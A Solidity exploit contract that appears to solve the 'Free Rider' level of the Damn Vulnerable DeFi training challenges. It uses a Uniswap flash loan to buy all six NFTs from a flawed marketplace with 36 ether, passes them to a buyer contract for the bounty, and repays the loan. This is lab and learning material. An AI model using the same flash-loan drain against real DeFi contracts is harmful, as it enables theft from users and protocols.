pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./FreeRiderBuyer.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";

import "hardhat/console.sol";

interface IWETH9 {
    function deposit() external payable ;
    function withdraw(uint wad) external payable;
    function totalSupply() external returns (uint);  
    function approve(address guy, uint wad) external returns (bool);
}

contract AaronScammer is IUniswapV2Callee, IERC721Receiver {
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT token;
    IERC20 weth;
    FreeRiderBuyer buyer;
    uint256 bounty;

    uint256[] all_ids;


    constructor(address payable _marketplace, address payable _token, address payable _weth, address _buyer, uint256 _bounty) {
        marketplace = FreeRiderNFTMarketplace(_marketplace);
        token = DamnValuableNFT(_token);
        weth = IERC20(_weth);
        buyer = FreeRiderBuyer(_buyer);
        bounty = _bounty;
        all_ids = [0, 1, 2, 3, 4, 5];
    }


    receive() payable external {}
    fallback() external payable {}
    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes memory _data) public override returns(bytes4) {
        console.log("wtf");
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }



    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        console.log("receiveFlashLoan(sender, amount0=%s, amount1=%s, calldata): balance=%s", amount0, amount1, weth.balanceOf(address(this)));

        IWETH9 weth2 = IWETH9(address(weth));
        weth2.withdraw(weth.balanceOf(address(this)));
        
        console.log("... eth balance before: %s", address(this).balance);
        marketplace.buyMany{value: 36 ether}(all_ids);
        console.log("... eth balance after: %s", address(this).balance);

        for (uint256 i = 0; i < all_ids.length; i++) {
            token.safeTransferFrom(address(this), address(buyer), all_ids[i]);
        }

        console.log("... eth balance bounty: %s", address(this).balance);

        console.log("... paying back uniswap loan");
        weth2.deposit{value: address(this).balance}();
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
        console.log("... finished uniswapV2Call");
    }
}
